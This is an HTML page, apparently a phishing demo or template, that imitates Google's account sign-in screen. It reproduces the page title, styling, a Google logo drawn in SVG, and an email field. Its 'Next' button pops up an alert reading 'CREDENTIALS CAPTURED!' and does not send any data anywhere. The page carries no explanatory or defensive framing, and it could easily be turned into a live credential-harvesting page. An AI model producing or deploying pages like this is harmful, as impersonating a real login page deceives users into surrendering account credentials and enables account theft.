<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <style>
        body { font-family: 'Roboto', arial, sans-serif; background-color: #fff; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .login-box { width: 100%; max-width: 450px; padding: 40px; text-align: center; border: 1px solid #dadce0; border-radius: 8px; }
        @media (max-width: 450px) { .login-box { border: none; padding: 20px; } }
        .logo { width: 75px; margin-bottom: 10px; }
        h1 { font-size: 24px; font-weight: 400; margin-bottom: 10px; color: #202124; }
        p { font-size: 16px; color: #202124; margin-bottom: 30px; }
        .input-group { position: relative; margin-bottom: 25px; text-align: left; }
        input { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; outline: none; }
        input:focus { border: 2px solid #1a73e8; padding: 12px 14px; }
        .forgot { color: #1a73e8; font-weight: 500; font-size: 14px; text-decoration: none; display: block; margin-top: 8px; }
        .footer-btns { display: flex; justify-content: space-between; align-items: center; margin-top: 40px; }
        .create-account { color: #1a73e8; font-weight: 500; font-size: 14px; text-decoration: none; }
        .next-btn { background-color: #1a73e8; color: #fff; padding: 10px 24px; border: none; border-radius: 4px; font-weight: 500; font-size: 14px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="login-box">
        <!-- Logo Google Asli -->
        <svg class="logo" viewBox="0 0 75 24" xmlns="http://www.w3.org/2000/svg">
            <path d="M7.15 12.85v-2.13h6.35c.06.37.09.76.09 1.16 0 1.8-.49 3.59-1.39 5.16-1.58 2.76-4.5 4.54-7.75 4.54C2.01 21.58 0 19.57 0 17.08c0-2.49 2.01-4.5 4.5-4.5.95 0 1.83.3 2.56.81l-1.54 1.54c-.31-.22-.65-.35-1.02-.35-1.38 0-2.5 1.12-2.5 2.5s1.12 2.5 2.5 2.5c1.07 0 1.98-.68 2.33-1.62H4.5v-2.11h2.65z" fill="#4285F4"/>
            <path d="M21.5 17.08c0 2.49-2.01 4.5-4.5 4.5s-4.5-2.01-4.5-4.5 2.01-4.5 4.5-4.5 4.5 2.01 4.5 4.5zm-2.13 0c0-1.38-1.07-2.5-2.37-2.5s-2.37 1.12-2.37 2.5 1.07 2.5 2.37 2.5 2.37-1.12 2.37-2.5z" fill="#EA4335"/>
            <path d="M31.5 17.08c0 2.49-2.01 4.5-4.5 4.5s-4.5-2.01-4.5-4.5 2.01-4.5 4.5-4.5 4.5 2.01 4.5 4.5zm-2.13 0c0-1.38-1.07-2.5-2.37-2.5s-2.37 1.12-2.37 2.5 1.07 2.5 2.37 2.5 2.37-1.12 2.37-2.5z" fill="#FBBC05"/>
            <path d="M41.5 17.08c0 2.49-2.01 4.5-4.5 4.5-1.27 0-2.42-.53-3.24-1.38v1.13h-2.13V12.83h2.13v1.13c.82-.85 1.97-1.38 3.24-1.38 2.49 0 4.5 2.01 4.5 4.5zm-2.13 0c0-1.38-1.07-2.5-2.37-2.5s-2.37 1.12-2.37 2.5 1.07 2.5 2.37 2.5 2.37-1.12 2.37-2.5z" fill="#4285F4"/>
            <path d="M45.5 12.83h2.13v8.5H45.5z" fill="#34A853"/>
            <path d="M56.5 17.08c0 .25-.02.5-.06.75h-6.31c.21 1.05 1.13 1.83 2.24 1.83.94 0 1.74-.56 2.08-1.35l1.88.78c-.68 1.54-2.22 2.62-4.04 2.62-2.49 0-4.5-2.01-4.5-4.5s2.01-4.5 4.5-4.5c2.49 0 4.29 2.01 4.21 4.37zm-2.13-.75c-.08-.94-.88-1.68-1.92-1.68s-1.85.74-2.05 1.68h3.97z" fill="#EA4335"/>
        </svg>
        <h1>Sign in</h1>
        <p>Use your Google Account</p>
        
        <div class="input-group">
            <input type="email" placeholder="Email or phone">
            <a href="#" class="forgot">Forgot email?</a>
        </div>

        <p style="text-align: left; font-size: 14px; color: #5f6368; line-height: 1.5;">
            Not your computer? Use Guest mode to sign in privately. <a href="#" style="color: #1a73e8; text-decoration: none; font-weight: 500;">Learn more</a>
        </p>

        <div class="footer-btns">
            <a href="#" class="create-account">Create account</a>
            <button class="next-btn" onclick="alert('CREDENTIALS CAPTURED!')">Next</button>
        </div>
    </div>
</body>
</html>
